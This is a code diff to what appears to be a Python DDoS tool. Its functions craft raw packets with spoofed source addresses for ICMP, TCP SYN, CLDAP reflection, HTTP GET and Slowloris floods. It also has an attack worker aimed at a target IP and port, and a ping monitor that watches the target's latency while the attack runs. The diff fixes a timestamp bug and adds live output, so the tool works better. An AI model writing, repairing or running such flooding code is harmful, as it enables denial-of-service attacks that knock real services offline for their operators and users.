@@ -180,9 +180,10 @@ def build_tcp_syn(src_ip, dst_ip, src_port, dst_port, seq=0, window=65535, ack=0
 def build_icmp_echo(src_ip, dst_ip, seq=0):
     pid = os.getpid() & 0xFFFF
     seq = seq or random.randint(0, 65535)
-    icmp = struct.pack('!BBHHH', 8, 0, 0, pid, seq) + b'PING' + time.time().to_bytes(8, 'big')
+    # FIX: use struct.pack for timestamp instead of .to_bytes()
+    icmp = struct.pack('!BBHHH', 8, 0, 0, pid, seq) + b'PING' + struct.pack('!d', time.time())
     chk = ip_checksum(icmp)
-    icmp = struct.pack('!BBHHH', 8, 0, chk, pid, seq) + b'PING' + time.time().to_bytes(8, 'big')
+    icmp = struct.pack('!BBHHH', 8, 0, chk, pid, seq) + b'PING' + struct.pack('!d', time.time())
     ip = build_ip_header(src_ip, dst_ip, 1, len(icmp), ttl=random.choice(TTL_VALUES))
     return ip + icmp
 
@@ -245,15 +246,11 @@ def build_cldap_query(src_ip, dst_ip, src_port, dst_port=389):
 def build_http_get(src_ip, dst_ip, src_port, dst_port, host, path='/'):
     headers = f"GET {path} HTTP/1.1\r\nHost: {host}\r\nUser-Agent: {random.choice(['Mozilla/5.0', 'curl/7.68', 'Wget/1.20'])}\r\nAccept: */*\r\nConnection: keep-alive\r\n\r\n"
     payload = headers.encode()
-    # We'll send as TCP SYN with payload? Actually TCP requires handshake; but we just send SYN with data? Simulate by UDP with HTTP header.
-    # For simplicity, we use UDP with HTTP request (ignoring TCP state). This is "fake".
     return build_udp_fragment(src_ip, dst_ip, src_port, dst_port, payload, 0, False)
 
 # ---- Slowloris: send partial HTTP headers ----
 def build_slowloris(src_ip, dst_ip, src_port, dst_port, host):
     line = f"GET / HTTP/1.1\r\nHost: {host}\r\n"
-    # Send line by line slowly via TCP SYN with payload? Again, simulate with UDP fragments.
-    # We'll send a single UDP with first line, then more fragments later.
     return build_udp_fragment(src_ip, dst_ip, src_port, dst_port, line.encode(), 0, True)
 
 # ---- Worker thread (attack) ----
@@ -432,7 +429,7 @@ def attack_worker(target_ip, target_port, src_pool, vector_list, stop_event, sta
     if sock:
         sock.close()
 
-# ---- Ping monitor (ICMP) ----
+# ---- Ping monitor (ICMP) - FIXED ----
 def ping_monitor(ip, stop_event, history):
     try:
         sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
@@ -443,9 +440,10 @@ def ping_monitor(ip, stop_event, history):
     while not stop_event.is_set():
         pid = os.getpid() & 0xFFFF
         seq = (seq + 1) % 65535
-        icmp = struct.pack('!BBHHH', 8, 0, 0, pid, seq) + b'PING' + time.time().to_bytes(8, 'big')
+        # FIX: use struct.pack for timestamp
+        icmp = struct.pack('!BBHHH', 8, 0, 0, pid, seq) + b'PING' + struct.pack('!d', time.time())
         chk = ip_checksum(icmp)
-        icmp = struct.pack('!BBHHH', 8, 0, chk, pid, seq) + b'PING' + time.time().to_bytes(8, 'big')
+        icmp = struct.pack('!BBHHH', 8, 0, chk, pid, seq) + b'PING' + struct.pack('!d', time.time())
         try:
             t1 = time.time()
             sock.sendto(icmp, (ip, 0))
@@ -454,10 +452,14 @@ def ping_monitor(ip, stop_event, history):
             if len(data) >= 28:
                 rtt = (t2 - t1) * 1000
                 history.append(("OK", rtt))
+                # Print every ping (real-time)
+                print(f"{Fore.MAGENTA}[PING] {rtt:.2f} ms")
             else:
                 history.append(("BAD", 0))
+                print(f"{Fore.MAGENTA}[PING] BAD REPLY")
         except socket.timeout:
             history.append(("TIMEOUT", 0))
+            print(f"{Fore.MAGENTA}[PING] TIMEOUT")
         except:
             pass
         time.sleep(0.5)
